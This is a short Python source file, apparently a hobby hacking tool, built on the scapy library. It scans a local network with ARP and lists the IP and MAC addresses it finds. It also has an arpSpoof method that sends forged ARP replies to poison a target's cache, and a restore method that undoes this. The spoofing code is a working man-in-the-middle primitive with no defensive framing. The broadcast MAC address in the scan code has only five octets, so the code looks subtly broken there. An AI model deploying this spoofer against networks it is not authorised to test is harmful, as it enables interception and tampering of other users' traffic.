import scapy.all as scapy
from yaspin import yaspin
from termcolor import colored


class Network:

    # Network Scanner

    def scan(self, ip, interface):
        arp = scapy.ARP(pdst=ip)
        ether = scapy.Ether(dst="ff:ff:ff:ff:ff")
        arp_broad = ether / arp
        answer = scapy.srp(arp_broad, timeout=8, iface=interface, verbose=False)[0]
        list_answer = []
        for el in answer:
            list_answer.append({"ip": el[1].psrc, "mac": el[1].hwsrc})
        return list_answer

    def nsResult(self, lists):
        print("--------------------------------------------------")
        print(colored("IP Adress \t\t\t MAC adress", 'green'))
        print("--------------------------------------------------")
        for el in lists:
            print(el["ip"] + "\t\t\t" + el["mac"])

    # ARP spoofer

    def arpSpoof(self, target, spoofip, dest_mac, interface):
        # scan=self.scan(target, interface)
        # print(scan)
        # dest_mac=scan[0]["mac"]
        resp = scapy.ARP(op=2, psrc=spoofip, pdst=target, hwdst=dest_mac)
        scapy.send(resp, verbose=False)

    def restore(self, dest_ip, src_ip, interface):
        macsrc = self.scan(src_ip, interface)[0]["mac"]
        macdst = self.scan(dest_ip, interface)[0]["mac"]
        req = scapy.ARP(op=2, psrc=src_ip, pdst=dest_ip, hwdst=macdst, hwsrc=macsrc)
        scapy.send(req, verbose=False, count=2)
